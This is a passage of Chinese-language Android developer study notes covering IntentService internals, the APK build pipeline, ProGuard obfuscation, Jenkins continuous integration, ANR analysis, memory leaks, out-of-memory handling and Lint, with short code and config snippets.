        @Override
        public void onCreate() {
            super.onCreate();
            HandlerThread thread = new HandlerThread("IntentService[" + mName + "]");
            thread.start();
            mServiceLooper = thread.getLooper();
            mServiceHandler = new ServiceHandler(mServiceLooper);
        }
    ```

* 每启动一次onStart方法，就会把数消息和数据发给mServiceHandler，相当于发送了一次Message消息给HandlerThread的消息队列。

    ```java
        @Override
        public void onStart(@Nullable Intent intent, int startId) {
            Message msg = mServiceHandler.obtainMessage();
            msg.arg1 = startId;
            msg.obj = intent;
            mServiceHandler.sendMessage(msg);
        }
    ```

* mServiceHandler会把数据传给onHandleIntent方法，onHandleIntent是个抽象方法，需要在IntentService实现，所以每次onStart方法之后都会调用我们自己写的onHandleIntent方法去处理。处理完毕使用stopSelf通知HandlerThread已经处理完毕，HandlerThread继续观察消息队列，如果还有未执行玩的message则继续执行，否则结束。

    ```java
        private final class ServiceHandler extends Handler {
            public ServiceHandler(Looper looper) {
                super(looper);
            }
            @Override
            public void handleMessage(Message msg) {
                onHandleIntent((Intent)msg.obj);
                stopSelf(msg.arg1);
            }
        }
    ```
    
### Android项目构建过程

下图展示了从一个Android项目构建出一个带有签名、对齐操作的APK包的完整过程（省略了代码混淆过程、NDK的编译过程）：

![Android项目构建过程](https://upload-images.jianshu.io/upload_images/2570030-10dfe75bfac561df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

下面是具体描述：

1. AAPT(Android Asset Packaging Tool)工具会打包应用中的资源文件，如AndroidManifest.xml、layout布局中的xml等，并将xml文件编译为二进制形式，当然assets文件夹中的文件不会被编译，图片及raw文件夹中的资源也会保持原来的形态，需要注意的是raw文件夹中的资源也会生成资源id。AAPT编译完成之后会生成R.java文件。
2. AIDL工具会将所有的aidl接口转化为java接口。
3. 所有的java代码，包括R.java与aidl文件都会被Java编译器编译成.class文件。
4. 如果开启了混淆，Proguard工具会将上述产生的.class文件及第三库及其他.class（包括android.jar）等文件进行混淆操作。
5. Dex工具会将所有需要的.class文件编译成.dex文件（dex文件是虚拟机可以执行的格式），dex文件最终会被打包进APK文件。
6. ApkBuilder工具会将编译过的资源及未编译过的资源（如图片等）以及.dex文件、NDK工具编译出的.so文件等打包成APK文件。
7. 生成APK文件后，需要对其签名才可安装到设备，平时测试时会使用debug keystore，当正式发布应用时必须使用release版的keystore对应用进行签名。
8. 如果对APK正式签名，还需要使用zipalign工具对APK进行对齐操作，这样做的好处是当应用运行时会提高速度，但是相应的会增加内存的开销。

详细版本如下：

![Android项目构建过程（详细版）](https://upload-images.jianshu.io/upload_images/2570030-3f527a7d770f308e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

### 代码混淆

#### 1. 代码混淆及其优点

##### 代码混淆的过程

混淆其实是包括了代码压缩、代码混淆以及资源压缩等的优化过程。

![代码混淆过程](https://upload-images.jianshu.io/upload_images/2570030-fa2fa6a208c46439.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

这四个流程默认开启，在Android项目中我们可以选择将“优化”和“预校验”关闭：

1. 压缩。移除无效的类、类成员、方法、属性等；
2. 优化。分析和优化方法的二进制代码；根据proguard-android-optimize.txt中的描述，优化可能会造成一些潜在风险，不能保证在所有版本的Dalvik上都正常运行。
3. 混淆。把类名、属性名、方法名替换为简短且无意义的名称；
4. 预校验。添加预校验信息。这个预校验是作用在Java平台上的，Android平台上不需要这项功能，去掉之后还可以加快混淆速度。

##### 代码混淆的优点

代码混淆的优点如下：

* ProGuard混淆流程将检测主项目以及依赖库中未被使用的类、类成员、方法、属性并移除，这有助于规避64K方法数的瓶颈
* 将类、类成员、方法重命名为无意义的简短名称，增加了逆向工程的难度（由于Java是一门跨平台的解释性语言，其源代码被编译成class字节码来适应其他平台，而class文件包含了Java源代码信息，很容易被反编译）
* 移除未被使用的资源，可以有效减小apk安装包大小

#### 2. 代码混淆操作、调试步骤

1. 开启混淆、开启资源压缩

    ```java
    android {
        buildTypes {
            release {
                minifyEnabled true
                shrinkResources true
                proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
            }
        }
    }
    ```

2. 在proguard-rules.pro添加自定义混淆规则

* 第三方库所需的混淆规则。正规的第三方库一般都会在接入文档中写好所需混淆规则，使用时注意添加。
* 在运行时动态改变的代码，例如反射。比较典型的例子就是会与 json 相互转换的实体类。假如项目命名规范要求实体类都要放在model包下的话，可以添加类似这样的代码把所有实体类都保持住：

    ```java
    -keep public class **.*Model*.** {*;}
    ```

* JNI中调用的类。
* WebView中JavaScript调用的方法
* Layout布局使用的View构造函数、android:onClick等。

3. 检查混淆结果，避免因混淆引入的bug。一方面，需要从代码层面检查。使用上文的配置进行混淆打包后在 <module-name>/build/outputs/mapping/release/ 目录下会输出以下文件：

    * dump.txt：描述APK文件中所有类的内部结构
    * mapping.txt：提供混淆前后类、方法、类成员等的对照表
    * seeds.txt：列出没有被混淆的类和成员
    * usage.txt：列出被移除的代码
    gi
4. 开启代码混淆后的调试

    ```bash
    retrace.bat|retrace.sh [-verbose] mapping.txt [<stacktrace_file>]
    ```
    
#### 3. 代码混淆的工作原理

ProGuard过程中将无用的字段或方法存入到EntryPoint中，将非EntryPoint的字段和方法进行替换，其中Entry Point是在ProGuard过程中不会被处理的类或方法。详细描述如下：

1. 在压缩的步骤中，ProGuard会从上述的Entry Point开始递归遍历，搜索哪些类和类的成员在使用，对于没有被使用的类和类的成员，就会在压缩段丢弃。
2. 在接下来的优化过程中，那些非Entry Point的类、方法都会被设置为private、static或final，不使用的参数会被移除，此外，有些方法会被标记为内联的。
3. 在混淆的步骤中，ProGuard会对非Entry Point的类和方法进行重命名。

#### 4. 参考文章

[写给Android开发者的混淆使用手册](https://www.jianshu.com/p/158aa484da13)

### 持续集成

#### 1. 持续集成的基本概念

* 持续集成（Continuous Integration），持续集成是一种软件开发实践，通过自动化的构建（包括编译、发布和自动化测试）来验证，从而帮助尽快发现集成错误。
* 持续集成一直被认为是敏捷开发的重要实践之一，也是提升软件质量的重要手段。特别在团队协作开发中，为项目添加持续集成还是非常有必要的，确保了任何时间、任何地点生成可部署的软件。

#### 2. Jenkins+Git+Gradle实现持续集成

1. 安装Jenkins，安装需要的插件（比如说git插件、Gradle插件），配置JDK，Git，Gradle等编译环境
2. 创建新的Jenkins项目，配置Git代码仓库地址、配置构建时的Gradle版本，和需要执行的Gradle Task
3. 配置Jenkins项目的构建参数，比如Gradle Task的参数、渠道参数
4. 配置邮件通知
5. 开始构建

#### 3. 参考文章
        
[Android Jenkins+Git+Gradle持续集成-实在太详细](https://www.jianshu.com/p/38b2e17ced73)

### ANR

#### 1. ANR是什么

Android中，主线程（UI线程）如果在规定时内没有处理完相应工作，就会出现ANR(Application Not Responding)，弹出页面无响应的对话框。

#### 2. ANR分类

1. Activity的输入事件（按键和触摸事件）5s内没被处理: Input event dispatching timed out
2. BroadcastReceiver的事件(onReceive方法)在规定时间内没处理完(前台广播为10s，后台广播为60s): Timeout of broadcast BroadcastRecord
3. Service在规定时间内（前台20s/后台200s）未响应: Timeout executing service
4. ContentProvider的publish在10s内没进行完: Timeout publishing content providers

#### 3. ANR的核心原因

* 主线程在做一些耗时的工作
* 主线程被其他线程锁
* cpu被其他进程占用，该进程没被分配到足够的cpu资源。

#### 4. ANR的原理

1. 在进行相关操作调用Handler.sendMessageAtTime()发送一个ANR的消息，延时时间为ANR发生的时间(如前台Service是当前时间20s之后)。
2. 进行相关的操作
3. 操作结束后向remove掉该条Message。
4. 如果相关的操作在规定时间没有执行完成，该条Message将被Handler取出并执行，就发生了ANR，并且由系统弹出ANR的弹窗。

#### 5. ANR的分析方法（主要是分析是否有死锁、通过调用栈定位耗时操作、系统资源情况）

1. 从/data/anr/traces.txt中找到ANR反生的信息：可以从log中搜索“ANR in”或“am_anr”，会找到ANR发生的log，该行会包含了ANR的时间、进程、是何种ANR等信息，如果是BroadcastReceiver的ANR可以怀疑BroadCastReceiver.onReceive()的问题，如果的Service或Provider就怀疑是否其onCreate()的问题。
2. 在该条log之后会有CPU usage的信息，表明了CPU在ANR前后的用量（log会表明截取ANR的时间），从各种CPU Usage信息中大概可以分析如下几点：

    * 如果某些进程的CPU占用百分比较高，几乎占用了所有CPU资源，而发生ANR的进程CPU占用为0%或非常低，则认为CPU资源被占用，进程没有被分配足够的资源，从而发生了ANR。这种情况多数可以认为是系统状态的问题，并不是由本应用造成的。
    * 如果发生ANR的进程CPU占用较高，如到了80%或90%以上，则可以怀疑应用内一些代码不合理消耗掉了CPU资源，如出现了死循环或者后台有许多线程执行任务等等原因，这就要结合trace和ANR前后的log进一步分析了。
    * 如果CPU总用量不高，该进程和其他进程的占用过高，这有一定概率是由于某些主线程的操作就是耗时过长，或者是由于主进程被锁造成的。
   
3. 除了上述的情况1以外，分析CPU usage之后，确定问题需要我们进一步分析trace文件。trace文件记录了发生ANR前后该进程的各个线程的stack。对我们分析ANR问题最有价值的就是其中主线程的stack，一般主线程的trace可能有如下几种情况：

    * 主线程是running或者native而对应的栈对应了我们应用中的函数，则很有可能就是执行该函数时候发生了超时。
    * 主线程被block:非常明显的线程被锁，这时候可以看是被哪个线程锁了，可以考虑优化代码。如果是死锁问题，就更需要及时解决了。
    * 由于抓trace的时刻很有可能耗时操作已经执行完了（ANR -> 耗时操作执行完毕 ->系统抓trace）。
   
#### 6. 如何避免ANR的方法（常见场景）

1. 主线程避免执行耗时操作（文件操作、IO操作、数据库操作、网络访问等）：

    Activity、Service（默认情况下）的所有生命周期回调
    BroadcastReceiver的onReceive()回调方法
    AsyncTask的回调除了doInBackground，其他都是在主线程中
    没有使用子线程Looper的Handler的handlerMessage，post(Runnable)都是执行在主线程中

2. 尽量避免主线程的被锁的情况，在一些同步的操作主线程有可能被锁，需要等待其他线程释放相应锁才能继续执行，这样会有一定的死锁、从而ANR的风险。对于这种情况有时也可以用异步线程来执行相应的逻辑。

#### 7. 参考文章

[Android ANR问题总结](https://www.jianshu.com/p/fa962a5fd939)

### 内存泄漏

#### 0. 内存问题的相关概念

* 内存溢出：指程序在申请内存时，没有足够的空间供其使用
* 内存泄漏：指程序分配出去的内存不再使用，无法进行回收
* 内存抖动：指程序短时间内大量创建对象，然后回收的现象

#### 1. 什么是内存泄漏

内存泄漏是一个对象已经不需要再使用了，但是因为其它的对象持有该对象的引用，导致它的内存不能被垃圾回收器回收。内存泄漏的慢慢积累，最终会导致OOM的发生。

#### 2. 内存泄漏的主要原因

长生命周期的对象持有短生命周期对象的引用就很可能发生内存泄漏。（短生命周期的对象不能被正确回收）

#### 3. Java内存分配策略
        
* 静态存储区（方法区）：主要存储全局变量和静态变量，在整个程序运行期间都存在
* 栈区：方法体的局部变量会在栈区创建空间，并在方法执行结束后会自动释放变量的空间和内存
* 堆区：保存动态产生的数据，如：new出来的对象和数组，在不使用的时候由Java回收器自动回收
        
#### 4. 常见的内存泄漏及其解决方案
        
* 单例造成的内存泄漏：在单例中，使用context.getApplicationContext()作为单例的context
* 匿名内部类造成的内存泄漏：由于非静态内部类持有匿名外部类的引用，必须将内部类设置为static、或者使用弱引用
* Handler造成的内存泄漏：使用static的Handler内部类，同时在实现内部类中持有Context的弱引用
* 避免使用static变量：由于static变量会跟Activity生命周期一致，当Activity退出后台被后台回收时，static变量是不安全，所以也要管理好static变量的生命周期
* 资源未关闭造成的内存泄漏：比如Socket、Broadcast、Cursor、Bitmap、ListView、集合容器等，使用完后要关闭
* AsyncTask造成的内存泄漏：由于非静态内部类持有匿名内部类的引用而造成内存泄漏，可以通过AsyncTask内部持有外部Activity的弱引用同时改为静态内部类或在onDestroy()中执行AsyncTask.cancel()进行修复
* WebView造成的内存泄漏：页面销毁的时候WebView需要正确移除并且调用其destroy方法

#### 5. LeakCanary检测内存泄漏核心原理

1. 给可被回收的对象上打了智能标记（弱引用，Key-Value的形式）。
2. 监听Activity的生命周期。
3. 如果Activity销毁之后过一小段时间对象依然没有被释放，就会给内存做个快照（Dump Memory），并且导出到本地文件。
4. 通过读取、分析这个heap dump文件：根据Key用SQL语句去查询数据库，并且计算出最短的GC root路径，从而找出阻止该对象释放的那个对象。
5. 通过UI（Debug版本是Notification）的形式把分析结果报告给开发者。

#### 6. 参考文章

[常见的内存泄漏原因及解决方法](https://www.jianshu.com/p/90caf813682d)

[用 LeakCanary 检测内存泄漏](https://academy.realm.io/cn/posts/droidcon-ricau-memory-leaks-leakcanary/)

[InputMethodManager.mLastSrvView memory leak in Android6.0 with huawei mobile phone #572](https://github.com/square/leakcanary/issues/572)

### 内存溢出

#### 1. 内存溢出是什么？

OOM指Out of memory（内存溢出），当前占用内存 + 我们申请的内存资源 超过了虚拟机的最大内存限制就会抛出Out of memory异常。

#### 2. 应用的内存限制与申请大内存

* Android虚拟机对单个应用的最大内存分配值定义在/system/build.prop文件中

    ```java
    //堆分配的初始大小，它会影响到整个系统对RAM的使用程度，和第一次使用应用时的流畅程度。它值越小，系统ram消耗越慢，但一些较大应用一开始不够用，需要调用gc和堆调整策略，导致应用反应较慢。它值越大，这个值越大系统ram消耗越快，但是应用更流畅。
    dalvik.vm.heapstartsize=xxxm
    //单个应用可用最大内存。最大内存限制主要针对的是这个值,它表示单个进程内存被限定在xxxm,即程序运行过程中实际只能使用xxxm内存，超出就会报OOM。（仅仅针对dalvik堆，不包括native堆）
    dalvik.vm.heapgrowthlimit=xxxm
    //单个进程可用的最大内存，但如果存在heapgrowthlimit参数，则以heapgrowthlimit为准。heapsize表示不受控情况下的极限堆，表示单个虚拟机或单个进程可用的最大内存。
    dalvik.vm.heapsize=xxxm
    ```

    ```java
    ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
    int memoryClass = am.getMemoryClass();
    ```

* 每开一个应用就会打开一个独立的虚拟机（这样设计就会在单个程序崩溃的情况下不会导致整个系统的崩溃）
* 在android开发中，如果要使用大堆，需要在manifest中指定android:largeHeap为true，这样dvm heap最大可达heapsize。尽量少使用large heap。使用额外的内存会影响系统整体的用户体验，并且会使得GC的每次运行时间更长。在任务切换时，系统的性能会变得大打折扣。

#### 3. 常见内存溢出及其解决方案

* 解决应用中的内存泄漏问题。
* 图片：正确缩放、压缩、解码、回收。
* 列表控件：重用convertView、使用LRU缓存算法、滚动的时候进行监听，此时不应该加载图片。
* View：避免在onDraw方法中创建对象。
* 谨慎使用多进程：使用多进程可以把应用中的部分组件运行在单独的进程当中，这样可以扩大应用的内存占用范围，但是这个技术必须谨慎使用，使用多进程会使得代码逻辑更加复杂，使用不当可能反而会导致显著增加内存。当应用需要运行一个常驻后台的任务，而且这个任务并不轻量，可以考虑使用这个技术。
* 使用更加轻量的数据结构。例如，我们可以考虑使用ArrayMap/SparseArray而不是HashMap等传统数据结构。
* 避免在Android里面使用Enum。
* 字符串拼接：在有些时候，代码中会需要使用到大量的字符串拼接的操作，这种时候有必要考虑使用StringBuilder来替代频繁的“+”。
* Try catch某些大内存分配的操作。
* 资源文件需要选择合适的文件夹进行存放。hdpi/xhdpi/xxhdpi等等不同dpi的文件夹下的图片在不同的设备上会经过scale的处理，拉伸之后内存消耗更大。对于不希望被拉伸的图片，需要放到assets或者nodpi的目录下。
* 在onLowMemory()与onTrimMemory()中适当释放内存。
* 珍惜Services资源。如果你的应用需要在后台使用service，除非它被触发并执行一个任务，否则其他时候Service都应该是停止状态。另外需要注意当这个service完成任务之后因为停止service失败而引起的内存泄漏。建议使用IntentService。
* 优化布局层次，减少内存消耗。越扁平化的视图布局，占用的内存就越少，效率越高。
* 谨慎使用依赖注入框架：使用之后，代码是简化了不少。然而，那些注入框架会通过扫描你的代码执行许多初始化的操作，这会导致你的代码需要大量的内存空间来mapping代码，而且mapped pages会长时间的被保留在内存中。
* 使用ProGuard来剔除不需要的代码，通过移除不需要的代码，重命名类，域与方法等等对代码进行压缩，优化与混淆。使得代码更加紧凑，能够减少mapping代码所需要的内存空间。
* 谨慎使用第三方libraries。很多开源的library代码都不是为移动网络环境而编写的，如果运用在移动设备上，并不一定适合。即使是针对Android而设计的library，也需要特别谨慎，特别是如果你知道引入的library具体做了什么事情的时候。
* 考虑不同的实现方式、方案、策略来优化内存占用。

#### 4. 参考文章

[Android 性能优化(内存之OOM)](https://www.jianshu.com/p/d8aee86463ad)

[Android 查看每个应用的最大可用内存](http://www.cnblogs.com/onelikeone/p/7112184.html)

### Lint与代码优化工具

#### 1. 什么是Lint？

Android Lint是一个静态代码分析工具，能够对检测代码质量——对项目中潜在的Bug、可优化的代码、安全性、性能、可用性、可访问性、国际化等进行检查（注：Lint检测不局限于代码，功能十分强大）。

通过下面的gradle命令开启Lint：

```bash
./gradlew lint
```

#### 2. Lint的工作流程

![lint](https://upload-images.jianshu.io/upload_images/2570030-a17d5937d178e83a.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

* App项目源文件：包括Java代码，XML代码，图标，以及ProGuard配置文件、Git忽略文件等
* lint.xml：Lint 检测的执行标准配置文件，我们可以修改它来允许或者禁止报告一些问题
* Lint工具按照标准配置文件中指定的规则去检测App项目源文件，发现问题，并且进行报告。常见的问题有：

    * Correctness：不够完美的编码，比如硬编码、使用过时API等
    * Performance：对性能有影响的编码，比如：静态引用，循环引用等
    * Internationalization：国际化，直接使用汉字，没有使用资源引用等，适配国际化的时候资源漏翻译
    * Security：不安全的编码，比如在WebView中允许使用JavaScriptInterface等
    * …

#### 3. 忽略Lint警告

* Java代码中忽略Lint警告:使用注解。注解跟@SuppressWarnings很类似，@SuppressLint(“忽略的警告名称”)，如果不清楚警告名称，直接写all表示忽略所有警告
* XML代码中忽略Lint警告:使用 tools:ignore=”忽略的警告名”

#### 4. Debug构建中关闭Lint检测



#### 5. 自定义Lint

* 创建lint.xml到根目录下，可以自定义Lint安全等级、忽略文件等
* 自定义Lint检查规则（比如日志不通过LogUtils打印则警告）：

    1. 依赖Android官方的lint的库
    2. 创建类继承Detector，实现一些规则
    3. 并且提供IssueRegistry向外提供Detector注册汇总信息
    4. 输出jar包或者aar包，主项目进行依赖
    5. 进行lint检测即可

#### 6. 一些其他的代码优化工具

* KW（Klockwork）扫描工具
* 阿里巴巴的编码规约扫描工具
* Uber的NullAway空指针扫描工具
* ……

#### 7. 参考文章

[Android 性能优化：使用 Lint 优化代码、去除多余资源](https://blog.csdn.net/u011240877/article/details/54141714)

[Android工具：被你忽视的Lint](https://blog.csdn.net/p106786860/article/details/54187138)

[自动规避代码陷阱——自定义Lint规则](https://blog.csdn.net/chzphoenix/article/details/78895106)

[Android Lint](https://www.jianshu.com/p/b4c44e62d652)

[Idea 阿里代码规约插件安装](https://blog.csdn.net/fuzhongyu2/article/details/78263317)

[使用Klockwork进行代码分析简单操作流程](https://blog.csdn.net/zm_21/article/details/34417651)

[NullAway：Uber用于检测Android上的NullPointerExceptions的开源工具](https://juejin.im/entry/59fa9e52f265da43215360ba)